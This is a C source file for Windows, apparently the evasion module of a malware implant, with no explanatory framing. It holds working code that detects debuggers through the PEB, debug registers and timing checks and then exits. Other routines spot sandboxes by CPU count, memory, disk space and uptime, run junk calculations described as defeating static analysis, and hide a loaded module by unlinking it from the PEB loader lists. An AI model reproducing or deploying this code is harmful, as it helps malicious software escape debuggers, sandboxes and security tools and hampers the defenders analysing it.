#include "evasion.h"
#include <wincrypt.h>

// generate trash using polymorphic calculations, different on every run, kills static analysis
void execute_junk_calculations() {
    volatile INT64 junk = 0xDEADBEEFDEADBEEF;
    for (int i = 0; i < 150; i++) {
        junk = _rotl64(junk, 13);
        junk ^= 0xABCDEF1234567890;
        junk = ~junk;
        junk = _rotr64(junk, 7);
        junk += 0x1111111111111111;
        junk = _byteswap_uint64(junk);
    }
}

void advanced_anti_debug() {
    BOOL isDebugged = FALSE;
    
    if (IsDebuggerPresent()) isDebugged = TRUE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb->BeingDebugged) isDebugged = TRUE;
    if (pPeb->NtGlobalFlag & 0x70) isDebugged = TRUE;
        CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) isDebugged = TRUE;
    }
    ULONGLONG start = __rdtsc();
    Sleep(1);
    ULONGLONG end = __rdtsc();
    if ((end - start) > 1000000) isDebugged = TRUE; 
    
    if (isDebugged) ExitProcess(0);
}

BOOL detect_sandbox() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE;
    
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    if (memoryStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return TRUE;
    
    ULARGE_INTEGER freeBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freeBytes);
    if (freeBytes.QuadPart < (10ULL * 1024 * 1024 * 1024)) return TRUE;
    
    if (GetTickCount() < 1800000) return TRUE; 
    
    return FALSE;
}

void integrity_checks() {
    PVOID base = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)base + dosHeader->e_lfanew);
    // code checksum 
    DWORD checksum = 0;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section->Characteristics & IMAGE_SCN_CNT_CODE) {
            for (DWORD j = 0; j < section->SizeOfRawData; j++) {
                checksum += *((BYTE*)base + section->VirtualAddress + j);
            }
            break;
        }
        section++;
    }
    
    if (checksum < 1000) ExitProcess(0);
}

BOOL is_safe_environment() {
    advanced_anti_debug();
    integrity_checks();
    
    if (detect_sandbox()) return FALSE;
    
    __try {
        __debugbreak();
        return FALSE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    return TRUE;
}

void hide_module(HMODULE hModule) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    
    #ifdef _WIN64
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    #else
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
    #endif
    
    // unlink module from PEB
    for (PLIST_ENTRY pEntry = pLdr->InLoadOrderModuleList.Flink; 
         pEntry != &pLdr->InLoadOrderModuleList; 
         pEntry = pEntry->Flink) {
        
        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        if (pModule->DllBase == hModule) {
            pModule->InLoadOrderLinks.Blink->Flink = pModule->InLoadOrderLinks.Flink;
            pModule->InLoadOrderLinks.Flink->Blink = pModule->InLoadOrderLinks.Blink;
            
            pModule->InMemoryOrderLinks.Blink->Flink = pModule->InMemoryOrderLinks.Flink;
            pModule->InMemoryOrderLinks.Flink->Blink = pModule->InMemoryOrderLinks.Blink;
            
            pModule->InInitializationOrderLinks.Blink->Flink = pModule->InInitializationOrderLinks.Flink;
            pModule->InInitializationOrderLinks.Flink->Blink = pModule->InInitializationOrderLinks.Blink;
            
            break;
        }
    }
}